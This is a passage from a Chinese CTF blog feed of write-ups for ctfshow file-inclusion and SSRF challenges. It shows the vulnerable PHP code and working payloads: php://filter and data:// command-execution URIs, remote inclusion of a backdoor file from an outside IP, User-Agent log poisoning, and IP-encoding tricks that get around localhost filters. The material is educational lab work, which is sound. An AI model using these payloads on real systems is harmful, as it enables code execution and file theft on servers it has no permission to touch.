            "id": "http://blog.g01den.top/posts/ad175165.html",
            "url": "http://blog.g01den.top/posts/ad175165.html",
            "title": "ctfshow-文件包含",
            "date_published": "2024-11-24T13:38:01.000Z",
            "content_html": "<p>竞争包含先不写了，有时间再写。</p>\n<h1 id=\"web78\"><a class=\"markdownIt-Anchor\" href=\"#web78\">#</a> Web78</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t常规文件包含，直接读 flag.php，filter 伪协议：</p>\n<blockquote>\n<p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p>\n</blockquote>\n<h1 id=\"web79\"><a class=\"markdownIt-Anchor\" href=\"#web79\">#</a> Web79：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;php&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这次有点不一样，带了个 str_replace 替换，所以读文件估计危险，打一打另外的操作</p>\n<blockquote>\n<p>?file=data://text/plain,<?=`tac f*`;?></p>\n</blockquote>\n<h1 id=\"web80\"><a class=\"markdownIt-Anchor\" href=\"#web80\">#</a> Web80：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;php&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;data&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"解法一\"><a class=\"markdownIt-Anchor\" href=\"#解法一\">#</a> 解法一：</h2>\n<p>​\t\t远程文件包含，直接在服务器上写一个 txt 文件，之后 http 协议包含即可。</p>\n<blockquote>\n<p>?file=http://39.107.158.17/backdoor.txt</p>\n</blockquote>\n<h2 id=\"解法二\"><a class=\"markdownIt-Anchor\" href=\"#解法二\">#</a> 解法二：</h2>\n<p>​\t\t包含日志文件：</p>\n<p>​\t\t通过 burp 抓包，改 user-agent，在其后面加一个 php 代码，比如 phpinfo，</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>204e30c6-d77b-4e30-8694-5a79d576baf9.challenge.ctf.show</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0 &lt;?php phpinfo();?&gt;</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Dest</span><span class=\"punctuation\">: </span>document</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Mode</span><span class=\"punctuation\">: </span>navigate</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Site</span><span class=\"punctuation\">: </span>cross-site</span><br><span class=\"line\"><span class=\"attribute\">Priority</span><span class=\"punctuation\">: </span>u=0, i</span><br><span class=\"line\"><span class=\"attribute\">Te</span><span class=\"punctuation\">: </span>trailers</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后访问？file=/var/log/nginx/access.log 这个文件即可。</p>\n<h1 id=\"web81\"><a class=\"markdownIt-Anchor\" href=\"#web81\">#</a> Web81</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;php&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;data&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;:&quot;</span>, <span class=\"string\">&quot;???&quot;</span>, <span class=\"variable\">$file</span>);</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t和上一题一样，日志文件包含？file=/var/log/nginx/access.log 这个文件。</p>\n<h1 id=\"web88\"><a class=\"markdownIt-Anchor\" href=\"#web88\">#</a> Web88：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;</span>, <span class=\"variable\">$file</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t没有过滤冒号，豆号，斜杠和分号，data 协议打 base64，去掉末尾的等号：</p>\n<blockquote>\n<p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw</p>\n</blockquote>\n",
            "tags": [
                "Web"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/b856856d.html",
            "url": "http://blog.g01den.top/posts/b856856d.html",
            "title": "ctfshow-ssrf",
            "date_published": "2024-09-26T11:09:50.000Z",
            "content_html": "<h1 id=\"web351\"><a class=\"markdownIt-Anchor\" href=\"#web351\">#</a> web351：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"comment\">// 开启PHP文件  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"comment\">// 这行代码将PHP的错误报告级别设置为0，意味着关闭所有错误和警告的显示。这通常用于生产环境，以避免暴露敏感信息或错误信息给用户。然而，在开发过程中，保持错误报告开启是推荐的做法，以便及时发现和修复问题。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\"><span class=\"comment\">// `highlight_file()` 函数将指定的文件（这里是当前执行的文件，由 __FILE__ 魔术常量提供）的内容作为HTML格式的高亮源代码输出。这通常用于学习或展示代码，但在生产环境中可能会导致敏感信息泄露。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];  </span><br><span class=\"line\"><span class=\"comment\">// 这行代码从全局变量`$_POST`数组中获取键名为&#x27;url&#x27;的值，并将其赋值给变量`$url`。这意味着代码期望通过POST请求接收一个名为&#x27;url&#x27;的参数。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\"><span class=\"comment\">// 使用`curl_init()`函数初始化一个新的cURL会话，并将之前获取的`$url`作为参数传递给该函数。该函数返回一个cURL会话句柄，该句柄用于后续的所有cURL函数调用，并存储在变量`$ch`中。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"comment\">// 通过`curl_setopt()`函数设置cURL传输选项。这里，`CURLOPT_HEADER`选项被设置为0，表示在获取的内容中不包含HTTP头部。这通常是可取的，因为大多数时候我们只关心HTTP响应体（即网页内容）。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);  </span><br><span class=\"line\"><span class=\"comment\">// 再次使用`curl_setopt()`函数设置cURL传输选项。这次，`CURLOPT_RETURNTRANSFER`选项被设置为1，表示将cURL执行的结果作为字符串返回，而不是直接输出。这使得我们可以将结果存储在变量中供后续使用。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\"><span class=\"comment\">// 调用`curl_exec()`函数执行cURL会话。它会发送一个请求到`curl_init()`函数指定的URL，并返回执行结果。这里，执行结果被存储在变量`$result`中。如果请求失败，`curl_exec()`将返回`FALSE`。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\"><span class=\"comment\">// 使用`curl_close()`函数关闭cURL会话，并释放与之关联的所有资源。这是一个好习惯，可以避免资源泄露。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);  </span><br><span class=\"line\"><span class=\"comment\">// 最后，使用`echo`语句输出变量`$result`的内容，即cURL请求的结果。如果请求成功，这将输出请求的网页内容；如果请求失败（并且没有进行错误处理），则不会输出任何内容（除非之前关闭了错误报告）。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>  </span><br><span class=\"line\"><span class=\"comment\">// 结束PHP文件</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t扫后台扫到了 flag.php，由此，访问之后发现非本地无法访问，所以直接 ssrf 读文件：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"web352\"><a class=\"markdownIt-Anchor\" href=\"#web352\">#</a> web352：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;https&#x27;</span>)&#123;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class=\"line\"><span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">mixed</span> <span class=\"title function_ invoke__\">parse_url</span> ( <span class=\"keyword\">string</span> <span class=\"variable\">$url</span> [, <span class=\"keyword\">int</span> <span class=\"variable\">$component</span> = -<span class=\"number\">1</span> ] )</span><br></pre></td></tr></table></figure>\n<p>​\t\t本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</p>\n<p>​\t\t这道题过滤了 localhost 和 127.0.0，绕过方式挺多的：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url=http://0x7F.0.0.1/flag.php   16进制</span><br><span class=\"line\">url=http://0177.0.0.1/flag.php    8进制</span><br><span class=\"line\">url=http://0.0.0.0/flag.php</span><br><span class=\"line\">url=http://0/flag.php</span><br><span class=\"line\">url=http://127.127.127.127/flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"web353\"><a class=\"markdownIt-Anchor\" href=\"#web353\">#</a> web353：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;https&#x27;</span>)&#123;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/localhost|127\\.0\\.|\\。/i&#x27;</span>, <span class=\"variable\">$url</span>))&#123;</span><br><span class=\"line\"><span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t过滤了 127.0. 和句号，那么，绕过有下面的：<span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29sLjUyMDEwMS5jb20vd2FuZ2x1by9qaW56aGl6aHVhbmh1YW4v\">IP 地址进制转换网站</span></p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">十六进制</span><br><span class=\"line\">url=http://0x7F.0.0.1/flag.php</span><br><span class=\"line\">八进制</span><br><span class=\"line\">url=http://0177.0.0.1/flag.php</span><br><span class=\"line\">10 进制整数格式</span><br><span class=\"line\">url=http://2130706433/flag.php</span><br><span class=\"line\">16 进制整数格式，还是上面那个网站转换记得前缀0x</span><br><span class=\"line\">url=http://0x7F000001/flag.php</span><br><span class=\"line\">还有一种特殊的省略模式</span><br><span class=\"line\">127.0.0.1写成127.1</span><br><span class=\"line\">用CIDR绕过localhost</span><br><span class=\"line\">url=http://127.127.127.127/flag.php</span><br><span class=\"line\">url=http://0/flag.php</span><br><span class=\"line\">url=http://0.0.0.0/flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"web354\"><a class=\"markdownIt-Anchor\" href=\"#web354\">#</a> web354：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;https&#x27;</span>)&#123;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class=\"variable\">$url</span>))&#123;</span><br><span class=\"line\"><span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t过滤了 1 和 0，之类可以利用解析到 127.0.0.1 的域名作为绕过或者 302，前者：<span class=\"exturl\" 